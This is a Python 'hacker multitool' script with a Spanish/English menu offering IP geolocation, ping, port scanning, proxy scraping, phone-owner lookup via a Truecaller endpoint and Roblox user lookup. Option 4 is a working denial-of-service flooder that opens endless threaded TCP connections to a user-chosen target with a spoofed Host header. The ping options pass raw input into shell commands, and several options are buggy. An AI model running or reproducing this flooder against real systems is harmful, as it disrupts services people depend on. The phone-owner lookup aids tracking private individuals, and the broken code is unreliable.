import requests
import tempmail
from tempmail import EMail
import colorama
import psutil
import raducord
from raducord import Logger, Console
from colorama import Fore
import pystyle
from pystyle import Write, Add, Colorate, Colors
import threading
from threading import Thread
import os
import time
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.all import *
import socket
import random
import fake_headers 
from fake_headers import Headers


while True:
    Write.Print(f"""{Fore.WHITE}
    \t\t\t\t██╗    ██╗ ██╗███████╗
    \t\t\t\t██║    ██║███║██╔════╝
    \t\t\t\t██║ █╗ ██║╚██║███████╗
    \t\t\t\t██║███╗██║ ██║╚════██║
    \t\t\t\t╚███╔███╔╝ ██║███████║
    \t\t\t\t ╚══╝╚══╝  ╚═╝╚══════╝
    ════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════                  
                        [01] Ip information          [04] DoS                    [07] Ping web                
                        [02] Ping IP                 [05] Port scanner           [08] Password creator           
                        [03] URL to ip               [06] Proxy scraper          [>>] Next page 
    """, Colors.blue_to_red, interval=0.000000)
    
    opc = input(f"{Fore.BLUE}\nroot@w1s>")
    


    if opc == '1':
        i1 = input("[+]IP: ")
        def verificar_ip():
            Logger.warning("Loading, checking, IP")
            time.sleep(4)
            url = "https://ipinfo.io/{i1}"

            r = requests.get(url)

            if r.status_code == '404':
                print("[-]This ip dont exist")
                time.sleep(3)
            else:
                Logger.success("Success,Ip,founded")
                time.sleep(2)
                Logger.info("Getting, Info, Loading")
                time.sleep(3)
                Logger.warning("Success, info, founded")
                api = f"https://ipinfo.io/{i1}"
                response = requests.get(api)
                data = response.json()
                
                print("Success IP:", data.get('ip'))
                print("Hostname:", data.get('hostname'))
                print("Ciudad:", data.get('city'))
                print("Región:", data.get('region'))
                print("País:", data.get('country'))
                print("Proveedor de servicio de Internet (ISP):", data.get('org'))
                print("Latitud, Longitud:", data.get('loc'))
                time.sleep(12)
            
        verificar_ip()
    if opc == '':
        print("[X]Selecet a option")
        time.sleep(3)
        os.system('cls')
        continue

    if opc == '2':
        i2 = input("[+]IP: ")
        c1 = input("[?]Number of pings: ")


        comando = f'ping -n {c1} {i2}'

        resultado = os.system(comando)
        
        if resultado == 0:
            print("Ping completed...")


    if opc == '3':
        u1 = input("[+]URL: ")
        direccion_ip = socket.gethostbyname(u1)
        print(f"La dirección IP de {u1} es: {direccion_ip}")

    if opc == '4':
        target = str(input("Insert target's IP: "))
        port = int(input("Insert Port: "))
        Trd = int(input("Insert number of Threads: "))
        fake_ip = '44.197.175.168'

        def attack():
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                s.close()

        attack_num = 0

        def print_attack_num():
            global attack_num
            while True:
                print("Attack number:", attack_num)
                attack_num += 1

        for i in range(Trd):
            thread = threading.Thread(target=attack)
            thread.start()

        thread = threading.Thread(target=print_attack_num)
        thread.start()


    if opc == '5':
        def port_scan():
            target_host = input("Introduce la dirección IP o el nombre del host a escanear: ")
            
            print("Escaneando puertos abiertos en", target_host)
            for port in range(1, 1025):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    
                    s.settimeout(1)
                    
                    result = s.connect_ex((target_host, port))
                    
                    if result == 0:
                        Logger.success(f"Success, port,{port}")
                    
                    s.close()
                
                except KeyboardInterrupt:
                    print("\nEscaneo cancelado.")
                    break
                
                except socket.gaierror:
                    print("No se pudo resolver el nombre del host.")
                    break
                
                except socket.error:
                    print("No se pudo conectar al servidor.")
                    break

        if __name__ == "__main__":
            port_scan()

    if opc == '6':
        archivo = 'results.txt'


        url = 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&proxy_format=ipport&format=text'




        headers = Headers(headers=True).generate()


        def proxies_gen():
            response = requests.get(url, headers=headers)
            print(f"{Fore.BLUE}[@] Getting proxies...")
            time.sleep(5)

            if response.status_code == 200:
                with open(archivo , 'w') as f:
                    f.write(response.text)
                    print(f"{Fore.GREEN}[+]Proxies saved in Results.txt")

        proxies_gen()
    if opc == '7':
        u2 = input("[+]URL: ")
        c2 = input("[?]Number of pings: ")


        comando = f'ping -n {c1} {i2}'

        resultado = os.system(comando)
        
        if resultado == 0:
            print("Ping completed...")

    if opc == '8':
        def generate_password(length=12):
            password_characters = [chr(i) for i in range(33, 127)]  # Caracteres imprimibles en ASCII
            password = ''.join(random.choices(password_characters, k=length))
            return password


        
        password_length = 16

        
        password = generate_password(password_length)
        print("[+]Contraseña generada:", password)
        time.sleep(8)
        os.system('cls')
        continue
    
    def w1s2():
        while True:
            os.system('cls')
            Write.Print("""
        \t\t\t\t██╗    ██╗ ██╗███████╗
        \t\t\t\t██║    ██║███║██╔════╝
        \t\t\t\t██║ █╗ ██║╚██║███████╗
        \t\t\t\t██║███╗██║ ██║╚════██║
        \t\t\t\t╚███╔███╔╝ ██║███████║
        \t\t\t\t ╚══╝╚══╝  ╚═╝╚══════╝
        ════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════                  
                            [01] Number info             [04] Py to exe              [07] Soon...                
                            [02] Roblox info             [05] Temp mail              [08] Soon...           
                            [03] My IP                   [06] Soon....               
            """, Colors.blue_to_green, interval=0.00000)

            opc2 = Write.Input('root@w1s>', Colors.blue_to_red, interval=0.00000)

            

            

            
            if opc2 == '5':
                email = EMail()
                print("Your email adress: ", email.address,'Time: 120  seconds')
                msg = email.wait_for_message(timeout=120)
                print(msg.body)





            if opc2 == '4':
                cv = input("¿Has instalado pyinstaller? (y/n): ")
                if cv == 'n':
                    Console.execute_command('pip install pyinstaller')
                    Console.execute_command('cls')

                    cs = input('Pege la carpeta del archivo .py: ')
                    print(f'Execute this command in cmd: pyinstaller {cs}')
                    time.sleep(10)

                if cv == 'y':
                    cs = input('Pege la carpeta del archivo .py: ')
                    print(f'Execute this command in cmd: pyinstaller {cs}')
                    time.sleep(10)





            if opc2 == '3':
                print("[1] Public")
                print("[2] Private") 
                pv = input(">>")

                if pv == '2':
                    try:
                       
                        nombre_host = socket.gethostname()
                       
                        direccion_ip = socket.gethostbyname(nombre_host)
                        print("Tu dirección IP privada es:", direccion_ip)
                        time.sleep(5)
                    except socket.error as e:
                        print("Error al obtener la dirección IP privada:", e)    







                if pv == '1':
                    url = 'https://ifconfig.me/ip'
                    r = requests.get(url)
                    
                    if r.status_code == 200:
                        print('IP: ', r.text.strip())
                        time.sleep(5)
                    else:
                        print('Error al obtener la IP. Código de estado:', r.status_code)



                    
            
            if opc2 == '2':
                
                def obtener_info_roblox(roblox_id):
                    url = f'https://users.roblox.com/v1/users/{roblox_id}'

                    
                    response = requests.get(url)

                    
                    if response.status_code == 200:
                        data = response.json()
                        return data
                    else:
                        print(f"Error al obtener la información de Roblox: {response.status_code}")
                        return None

               
                roblox_id = input("Ingresa el ID de usuario de Roblox: ")

                
                info_usuario = obtener_info_roblox(roblox_id)

                
                if info_usuario:
                    print("Información del usuario de Roblox:")
                    print("Nombre de usuario:", info_usuario.get('name'))
                    print("Descripción:", info_usuario.get('description'))
                    print("Estado:", info_usuario.get('status'))
                    print("Fecha de creación:", info_usuario.get('created'))
                    time.sleep(10)
                else:
                    print("No se pudo obtener la información del usuario.")
                    time.sleep(10)



            if opc2 == '1':
                def obtener_info_truecaller(numero):
                    url = f'https://www.truecaller.com/api/search?countryCode=ES&phoneNumber={numero}'

                    try:
                        response = requests.get(url)
                        data = response.json()

                        if data['data']:
                            print("Nombre del propietario:", data['data'][0]['name'])
                            print("Ubicación:", data['data'][0]['location'])
                            print("Tipo de número:", data['data'][0]['type'])
                            
                        else:
                            print("Información no disponible para este número.")
                    except Exception as e:
                        print("Error al obtener la información:", e)

                
                numero = input('Number(expample: +34911222333): ')  # Ejemplo de número telefónico en España
                obtener_info_truecaller(numero)





            if opc2 == '':
                print("[x]Select a option")
                os.system('cls')
                

            

    if opc == '>>':
        w1s2()